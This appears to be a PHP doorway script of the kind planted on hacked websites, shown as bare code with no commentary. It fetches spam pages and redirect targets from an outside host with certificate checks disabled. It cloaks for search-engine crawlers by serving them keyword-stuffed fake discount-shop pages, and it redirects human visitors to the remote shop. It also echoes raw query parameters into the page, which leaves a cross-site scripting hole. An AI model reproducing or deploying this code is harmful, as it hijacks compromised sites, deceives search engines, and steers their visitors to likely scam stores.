<?php
error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
$sitemap_ = $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "?s=s&type=2&kk=3&g=" . mt_rand(1, 4) . "&pnum=" . mt_rand(1, 15) . "";

$kgurl="https://kjhsan.top/1.aspx";

if (!is_null($_GET['g'])) {
	$jd = getCurl($kgurl . "?sz=" . $_GET['g']);
	$sz = $_GET['g'];
} else {
	$jd = getCurl($kgurl . "?xy=" . $http_type);
	$sz = getCurl($kgurl . "?jd=" . $jd);
}

$hyzhdy = $jd . "JG666.aspx";
$surl = $jd . "S888.aspx";


if (!is_null($_GET['s'])) {
	$surl = $surl . "?number=" . $_GET['number'] . "&pnum=" . $_GET['pnum'] . "&cid=" . $_GET['cid'] . "&type=" . $_GET['type'];
	$str = getCurl($surl);
	$str = str_replace('yymm', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
	$str = str_replace('ggggg', $sz, $str);
	echo $str;
	exit();
}

$kname = "";
if (!is_null($_GET['shop'])) {
	$kname = urldecode($_GET['shop']);
}
$ip = GetIp();
if (!is_null($_GET['kk'])) {
	$ip = "66.249.64.190";
}
$domain = getCurl($vurl . "getdomain.aspx?rnd=1&ip=" . $ip);
$ddd = $jd . "a.aspx";
if (stripos($domain, 'google') != false or stripos($domain, 'msn.com') != false or stripos($domain, 'yahoo.com') != false or stripos($domain, 'aol.com') != false or stripos($domain, 'yandex') != false) {
} else {
	if (!is_null($_GET['iid']) || !is_null($_GET['shop'])) {

		$kname = urldecode($_GET['shop']);
		echo '<script>document.location="' . $ddd . "?cid=" . $_GET['cid'] . "&cname=" . urlencode($kname) . '"</script>';
		exit();
	}
	if (!is_null($_GET['pnum'])) {
		$txt = str_replace("products.aspx", "", $ddd) . "?cid=" . $_GET['cid'] . "";
		echo '<script>document.location="' . $txt . '"</script>';
		exit();
	}
}
function GetIp()
{
	$ip = $_SERVER['REMOTE_ADDR'] . "*" . $_SERVER['REMOTE_HOST'] . "*" . $_SERVER['HTTP_CLIENT_IP'] . "*" . $_SERVER['HTTP_X_FORWARDED_FOR'] . "*" . $_SERVER['HTTP_X_FORWARDED'] . "*" . $_SERVER['HTTP_FORWARDED_FOR'] . "*" . $_SERVER['HTTP_FORWARDED'];
	return $ip;
}
function getCurl($url)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}
?>
<html>

<head>
	<script>
		document.cookie = "u=" + window.location.href;
	</script>
	<title><?php error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
			echo $kname ?> - OFF-<?php echo mt_rand(50, 70) ?>% >Free Delivery</title>
	<meta name="keywords" content="<?php echo $kname ?>" />
	<meta name="description" content="Clear warehouse！was discovered by you > OFF - <?php echo mt_rand(50, 70) ?>% <?php echo $kname ?> Best Cheap Online Shopping Site: Secure Payments, Fast Delivery, Discover Millions of Great Discounts, Make Your Shopping Fun and Surprise, and Free Home Shipping!<?php echo $_GET['searchtxt'] ?>" />
	<meta name="robots" content="index,follow,all" />
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
	<link rel="sitemap" type="application/xml" title="Sitemap" href="<?php echo $sitemap_ ?>" />
</head>

<body>

	<?php

	if (!is_null($_GET['iid'])) {

		$hyzhdy = $hyzhdy . "?iid=" . urlencode($_GET['iid']) . "&cid=" . $_GET['cid'];
	} else if (!is_null($_GET['shop'])) {
		$hyzhdy = $hyzhdy . "?shop=" . urlencode($_GET['shop']) . "&cid=" . $_GET['cid'];
	} else {
		if (!is_null($_GET['pnum'])) {
			$hyzhdy = $hyzhdy . "?cid=" . $_GET['cid'] . "&pnum=" . $_GET['pnum'];
		}
	}
	$str = getCurl($hyzhdy);
	$str = str_replace('ggggg', $sz, $str);
	$str = str_replace('IIIII', $http_type . $_SERVER['HTTP_HOST'], $str);
	$str = str_replace('UUUUU', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
	$str = str_replace('HHHHH', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
	$str = str_replace('BBBBB', $_SERVER['HTTP_HOST'], $str);
	$str = str_replace('NNNNN', $kname . $_GET['iid'], $str);
	$str = str_replace('SSSSS', $kname . $_GET['iid'] . $_GET['pnum'], $str);
	$str = str_replace('DDDDD', $kname . "<div style='display: block'><ul><li>Related links: <a href='" . $_SERVER['SCRIPT_NAME'] . "?g=" . mt_rand(1, 4) . "&pnum=" . mt_rand(1, 30) . "'>Plus</a></ul></div>" . $_GET['searchtxt'], $str);
	echo $str;

	?>

</body>

</html>